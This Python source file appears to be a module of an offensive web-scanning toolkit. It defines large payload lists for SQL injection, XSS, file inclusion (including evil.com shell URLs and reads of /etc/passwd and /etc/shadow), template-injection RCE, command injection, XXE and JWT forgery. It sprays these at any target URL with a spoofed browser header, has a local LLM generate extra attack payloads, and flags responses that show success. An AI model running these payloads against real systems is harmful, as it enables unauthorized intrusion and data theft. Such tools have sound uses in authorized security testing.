import requests
import time
import re
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

try:
    import bs4
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

FUZZ_CATEGORIES = {
    "sqli": [
        ("'", "Single quote"),
        ("''", "Double quote"),
        ("' OR '1'='1", "OR 1=1 str"),
        ("' OR 1=1 -- ", "OR 1=1 comment"),
        ("' UNION SELECT 1,2,3 -- ", "UNION select"),
        ("' AND SLEEP(3) -- ", "Time-based"),
        ("1' ORDER BY 1 -- ", "ORDER BY"),
        ("' AND 1=1 -- ", "AND true"),
        ("' AND 1=2 -- ", "AND false"),
    ],
    "xss": [
        ("<script>alert(1)</script>", "Basic script"),
        ("<img src=x onerror=alert(1)>", "Img onerror"),
        ("<svg onload=alert(1)>", "SVG onload"),
        ("\" onmouseover=alert(1) x=\"", "Attr break"),
        ("<body onload=alert(1)>", "Body onload"),
        ("<details open ontoggle=alert(1)>", "Details toggle"),
        ("javascript:alert(1)", "JS pseudo"),
    ],
    "lfi": [
        ("../../../../etc/passwd", "Linux passwd"),
        ("../../../../windows/win.ini", "Windows ini"),
        ("../../../../etc/shadow", "Linux shadow"),
        ("....//....//....//etc/passwd", "Double dot bypass"),
        ("..\\..\\..\\..\\windows\\win.ini", "Windows backslash"),
        ("/etc/passwd", "Absolute Linux"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter"),
        ("php://filter/convert.base64-encode/resource=config", "PHP filter config"),
        ("file:///etc/passwd", "File protocol"),
        ("/proc/self/environ", "Proc environ"),
        ("/proc/self/cmdline", "Proc cmdline"),
        ("/proc/self/fd/0", "Proc fd"),
    ],
    "rfi": [
        ("https://evil.com/shell.txt?", "External PHP"),
        ("http://evil.com/shell.txt?", "External HTTP"),
        ("//evil.com/shell.txt?", "Protocol relative"),
        ("data:text/plain;base64,dGVzdA==", "Data URI"),
    ],
    "ssti": [
        ("{{7*7}}", "Jinja2 basic"),
        ("{{7*'7'}}", "Jinja2 string"),
        ("${7*7}", "Freemarker"),
        ("${{7*7}}", "Velocity"),
        ("#{7*7}", "Ruby/SSTI"),
        ("*{7*7}", "EL"),
        ("{{config}}", "Flask config"),
        ("{{''.__class__.__mro__[2].__subclasses__()}}", "Jinja2 RCE"),
        ("{{get_flashed_messages.__globals__.__builtins__}}", "Jinja2 builtins"),
    ],
    "command_injection": [
        ("; ls", "Semicolon ls"),
        ("| ls", "Pipe ls"),
        ("|| ls", "OR pipe"),
        ("` ls`", "Backtick ls"),
        ("$(ls)", "Subshell ls"),
        ("& ls &", "Bg ls"),
        ("; id", "Semicolon id"),
        ("| whoami", "Pipe whoami"),
        ("$(cat /etc/passwd)", "Subshell cat"),
    ],
    "open_redirect": [
        ("https://evil.com", "Absolute URL"),
        ("//evil.com", "Protocol relative"),
        ("/\\evil.com", "Backslash trick"),
        ("https://evil.com@real.com", "Credentials in URL"),
        ("https://evil.com.evildomain.com", "Subdomain confusion"),
        ("/https://evil.com", "Relative protocol"),
    ],
    "path_traversal": [
        ("/../", "Parent dir"),
        ("/..;/", "Semicolon traversal"),
        ("/%2e%2e/", "Encoded dot"),
        ("/....//....//", "Deep traversal"),
        ("/..\\", "Backslash traversal"),
        ("/%c0%ae%c0%ae/", "Unicode overlong"),
        ("/%252e%252e%252f", "Double encoded"),
    ],
    "noSQL_injection": [
        ("' && 1 && '1'=='1", "Mongo tautology"),
        ("' && 1 && '1'=='2", "Mongo false"),
        ("' ; return true; var foo='", "JS return"),
        ("{$gt: ''}", "Mongo $gt"),
        ("\" && 1 && \"1\"==\"1", "Mongo dq"),
        ("?username[$ne]=admin", "Mongo $ne"),
    ],
    "ldap_injection": [
        ("*", "Wildcard"),
        ("*)(&", "Close+AND"),
        ("*)(uid=*))(|(uid=*", "LDAP bypass"),
        ("admin*", "Admin wildcard"),
    ],
    "xxe": [
        ("<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>", "XXE file read"),
        ("<?xml version=\"1.0\"?><root>test</root>", "XML probe"),
    ],
    "parameter_pollution": [
        ("&id=1&id=2", "Duplicate id"),
        ("&page=1&page=admin", "Duplicate page"),
        ("&user=admin&user=user", "Duplicate user"),
    ],
    "debug": [
        ("?debug=true", "Debug flag"),
        ("?debug=1", "Debug 1"),
        ("?source=1", "Source reveal"),
        ("?show=source", "Show source"),
        ("?test=1", "Test mode"),
        ("?env=1", "Env reveal"),
        ("?config=1", "Config reveal"),
        ("?phpinfo=1", "PHP info"),
        ("?admin=1", "Admin bypass"),
        ("?access=admin", "Access check"),
    ],
    "api_fuzzing": [
        ("", "Empty value"),
        ("null", "Null value"),
        ("undefined", "Undefined"),
        ("-1", "Negative one"),
        ("0", "Zero"),
        ("999999999999", "Large number"),
        ("-999999999999", "Large negative"),
        ("true", "Boolean true"),
        ("false", "Boolean false"),
        ("[]", "Empty array"),
        ("{}", "Empty object"),
        ("[*]", "Array injection"),
        ("__proto__", "Prototype pollution"),
        ("constructor", "Constructor pollution"),
    ],
    "jwt_none": [
        ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.", "None algorithm"),
        ("eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6ImFkbWluIn0.", "Admin none alg"),
    ],
}

PARAMETER_PAYLOADS = {
    "id": ["1'", "1 AND 1=1", "1 UNION SELECT 1,2,3--", "../../../etc/passwd", "1 SLEEP(3)"],
    "page": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index", "/etc/passwd", "1"],
    "search": ["<script>alert(1)</script>", "' OR '1'='1", "*", "{{7*7}}"],
    "q": ["<script>alert(1)</script>", "' OR '1'='1", "test", "../../../etc/passwd"],
    "file": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index", "/etc/passwd"],
    "redirect": ["https://evil.com", "//evil.com", "javascript:alert(1)"],
    "url": ["https://evil.com", "javascript:alert(1)", "//evil.com"],
    "cmd": ["ls", "id", "whoami", "cat /etc/passwd", "ls -la"],
    "exec": ["ls", "id", "whoami", "cat /etc/passwd"],
    "action": ["delete", "edit", "modify", "admin", "all"],
    "token": ["null", "undefined", "false", "0", "1"],
    "password": ["' OR '1'='1", "admin", "password", "123456"],
    "username": ["' OR '1'='1", "admin'--", "admin", "root"],
    "email": ["' OR '1'='1", "test'@test.com", "'", "../../../etc/passwd"],
    "host": ["localhost", "127.0.0.1", "0.0.0.0", "internal", "10.0.0.1"],
    "port": ["80", "443", "8080", "22", "1-65535"],
    "name": ["'", "<script>alert(1)</script>", "../../../etc/passwd"],
    "path": ["../../../../etc/passwd", "/", "/etc/passwd", "\\..\\..\\..\\windows\\win.ini"],
    "dest": ["https://evil.com", "//evil.com"],
    "target": ["../../../../etc/passwd", "https://evil.com", "localhost"],
}


class AdvancedURLFuzzer:
    name = "fuzz"
    description = "Advanced URL fuzzer (SQLi, XSS, LFI, SSTI, CMDi, API, parameter pollution, prototype pollution, JWT none)"

    @staticmethod
    def run(target, params=None, threads=20, ollama_model=None):
        section(f"Advanced URL Fuzzer: {target}")

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None

        parsed = urlparse(target)
        existing_params = parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        all_findings = []
        baseline = {}

        try:
            baseline_resp = requests.get(target, timeout=10,
                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                allow_redirects=False)
            baseline["status"] = baseline_resp.status_code
            baseline["size"] = len(baseline_resp.content)
            baseline["body"] = baseline_resp.text
            info(f"Baseline: HTTP {baseline['status']}, {baseline['size']} bytes")
        except Exception as e:
            warning(f"Could not establish baseline: {e}")
            baseline["status"] = 0
            baseline["size"] = 0
            baseline["body"] = ""

        section("Phase 0: Ollama Custom Payload Generation")
        if ollama and ollama.available and existing_params:
            for param_name in existing_params:
                tech_hints = []
                try:
                    hr = requests.get(target, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
                    s = hr.headers.get("Server", "")
                    p = hr.headers.get("X-Powered-By", "")
                    tech_hints = [s, p] if s or p else None
                except:
                    pass
                ai_payloads = ollama.generate_fuzz_payloads(param_name, tech_hints)
                if ai_payloads:
                    info(f"Ollama generated {len(ai_payloads)} payloads for '{param_name}'")
                    for payload in ai_payloads[:5]:
                        try:
                            test_params = {k: v[0] for k, v in existing_params.items()}
                            test_params[param_name] = payload
                            qs = urlencode(test_params)
                            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))
                            resp = requests.get(test_url, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)
                            AdvancedURLFuzzer.analyze_response(
                                test_url, param_name, payload, "ollama_ai",
                                resp, baseline, all_findings
                            )
                        except:
                            pass

        section("Phase 1: Parameter Fuzzing by Type")
        if existing_params:
            for param_name in existing_params:
                param_lower = param_name.lower()
                payloads = PARAMETER_PAYLOADS.get(param_lower, ["'", "1", "test", "<script>alert(1)</script>", "../../../etc/passwd"])
                original_value = existing_params[param_name][0]
                for payload in payloads:
                    try:
                        test_params = {k: v[0] for k, v in existing_params.items()}
                        test_params[param_name] = payload
                        qs = urlencode(test_params)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))

                        resp = requests.get(test_url, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                            allow_redirects=False)

                        AdvancedURLFuzzer.analyze_response(
                            test_url, param_name, payload, "param_fuzz",
                            resp, baseline, all_findings
                        )
                    except:
                        pass

        section("Phase 2: Multi-Category Payload Injection on Existing Parameters")
        if existing_params:
            for param_name in existing_params:
                for category, payloads in FUZZ_CATEGORIES.items():
                    for payload, payload_name in payloads[:3]:
                        try:
                            test_params = {k: v[0] for k, v in existing_params.items()}
                            test_params[param_name] = payload
                            qs = urlencode(test_params)
                            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, qs, parsed.fragment))

                            resp = requests.get(test_url, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)

                            AdvancedURLFuzzer.analyze_response(
                                test_url, param_name, payload, category,
                                resp, baseline, all_findings
                            )
                        except:
                            pass

        section("Phase 3: Path Traversal Fuzzing on URL")
        traversal_paths = [
            "/..;/", "/../", "/%2e%2e/", "/%c0%ae%c0%ae/",
            "/....//....//", "/\\../",
            "/WEB-INF/web.xml", "/WEB-INF/classes/application.properties",
            "/.git/config", "/.env", "/admin/..;/..;/..;/etc/passwd",
        ]
        for path in traversal_paths:
            test_url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            if not test_url.startswith(base_url):
                test_url = urljoin(base_url, path)
            try:
                resp = requests.get(test_url, timeout=10,
                    headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                    allow_redirects=False)
                if resp.status_code not in (404,) and len(resp.content) > 100:
                    warning(f"[{resp.status_code}] {test_url} ({len(resp.content)} bytes)")
                    all_findings.append({
                        "type": "path_traversal", "target": test_url,
                        "payload": path, "status": resp.status_code,
                        "size": len(resp.content),
                    })
            except:
                pass

        section("Phase 4: HTTP Verb + Param Fuzzing")
        for method in ["POST", "PUT", "PATCH"]:
            if existing_params:
                for param_name in list(existing_params.keys())[:3]:
                    for payload, payload_name in list(FUZZ_CATEGORIES["command_injection"])[:2]:
                        try:
                            test_params = {k: v[0] for k, v in existing_params.items()}
                            test_params[param_name] = payload
                            resp = requests.request(method, target, data=test_params, timeout=10,
                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                                allow_redirects=False)
                            if resp.status_code not in (403, 404, 405, 501) and resp.status_code != baseline["status"]:
                                info(f"[{method}] {param_name}={payload[:30]} -> {resp.status_code}")
                        except:
                            pass

        if params:
            section("Phase 5: Custom Parameter Fuzzing")
            for param in params.split(","):
                param = param.strip()
                param_lower = param.lower()
                payloads = PARAMETER_PAYLOADS.get(param_lower, ["'", "1", "test"])
                for payload in payloads:
                    sep = "?" if "?" not in target else "&"
                    test_url = f"{target.rstrip('/')}{sep}{param}={quote(payload)}"
                    try:
                        resp = requests.get(test_url, timeout=10,
                            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
                            allow_redirects=False)
                        AdvancedURLFuzzer.analyze_response(
                            test_url, param, payload, "custom_param",
                            resp, baseline, all_findings
                        )
                    except:
                        pass

        section("Fuzzing Results Summary")
        if all_findings:
            high_risk = [f for f in all_findings if f.get("risk") == "HIGH"]
            med_risk = [f for f in all_findings if f.get("risk") == "MEDIUM"]
            categories_found = set(f["type"] for f in all_findings)

            warning(f"Total anomalous responses: {len(all_findings)}")
            if high_risk:
                error(f"HIGH RISK: {len(high_risk)}")
                for f in high_risk:
                    result(f"  [{f['type']}]", f"{f.get('target', '')[:60]} -> {f.get('indicator', '')}")
            if med_risk:
                warning(f"MEDIUM RISK: {len(med_risk)}")

            result("Categories triggered", ", ".join(sorted(categories_found)[:8]))

            for category in sorted(categories_found):
                cat_findings = [f for f in all_findings if f["type"] == category]
                info(f"  {category}: {len(cat_findings)} finding(s)")
                for f in cat_findings[:3]:
                    result(f"    [{f.get('status','?')}]", f"{f.get('indicator', 'size/code change')}")
        else:
            warning("No anomalous responses detected")
            info("Fuzzing is a numbers game — try different payloads or parameters manually")

        return {"target": target, "findings": all_findings}

    @staticmethod
    def analyze_response(test_url, param, payload, category, resp, baseline, findings):
        status = resp.status_code
        size = len(resp.content)
        body = resp.text
        base_size = baseline.get("size", 0)
        base_status = baseline.get("status", 0)

        size_diff = abs(size - base_size) if base_size > 0 else 0
        status_diff = status != base_status
        error_patterns = []
        risk = "LOW"

        sql_errors = ["sql", "mysql", "syntax error", "unclosed quotation", "odbc", "ora-", "oracle", "postgresql"]
        xss_reflections = ["<script>alert", "onerror=alert", "onload=alert"]
        path_indicators = ["root:", "bin:", "daemon:", "www-data:", "[extensions]", "[fonts]"]

        for pattern in sql_errors:
            if pattern in body.lower():
                error_patterns.append(f"SQL:{pattern}")
                risk = "HIGH"

        for pattern in xss_reflections:
            if pattern in body:
                error_patterns.append(f"XSS:{pattern}")
                risk = "HIGH"

        for pattern in path_indicators:
            if pattern in body:
                error_patterns.append(f"LFI:{pattern}")
                risk = "HIGH"

        if "{{7*7}}" in payload and "49" in body:
            error_patterns.append("SSTI:7*7=49")
            risk = "HIGH"

        if "${7*7}" in payload and "49" in body:
            error_patterns.append("SSTI:${7*7}=49")
            risk = "HIGH"

        if "id" in payload and ("uid=" in body or "gid=" in body):
            error_patterns.append("CMDi:id executed")
            risk = "HIGH"

        if "whoami" in payload and ("root" in body or "www-data" in body or "admin" in body):
            error_patterns.append("CMDi:whoami executed")
            risk = "HIGH"

        if "localhost" in payload and "localhost" in body[:100]:
            error_patterns.append("SSRF:reflected")

        interesting = False
        if error_patterns:
            interesting = True
        elif status_diff and status not in (404, 400, 403):
            interesting = True
            risk = "MEDIUM"
        elif size_diff > 500 and base_size > 0:
            interesting = True
            risk = "MEDIUM"
        elif status in (200, 201, 202, 204, 301, 302, 307, 401, 403, 500):
            interesting = True
            risk = "LOW"

        if interesting:
            indicator = " | ".join(error_patterns) if error_patterns else f"HTTP {status} vs baseline {base_status}, size {size} vs {base_size}"
            if risk == "HIGH":
                warning(f"[{risk}] [{category}] {param}={payload[:40]} -> {indicator}")
            elif risk == "MEDIUM":
                info(f"[{risk}] [{category}] {param}={payload[:40]} -> {indicator}")

            findings.append({
                "type": category,
                "target": test_url,
                "param": param,
                "payload": payload,
                "status": status,
                "size": size,
                "risk": risk,
                "indicator": indicator,
                "error_patterns": error_patterns,
            })
